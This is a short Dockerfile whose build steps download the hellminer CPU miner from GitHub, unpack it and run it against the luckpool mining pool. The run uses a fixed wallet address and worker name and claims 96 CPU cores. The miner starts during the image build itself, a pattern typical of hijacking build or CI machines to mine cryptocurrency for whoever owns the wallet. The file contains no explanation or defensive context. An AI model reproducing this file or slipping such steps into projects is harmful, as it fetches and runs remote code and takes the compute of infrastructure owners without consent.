FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt-get update
RUN apt-get install wget -y
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar xf hellminer_cpu_linux.tar.gz
RUN chmod +u hellminer
RUN ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCT2S85q77oYSjQyU19UMmLCp8vSbXRuxT.MonG2022 -p x --cpu 96
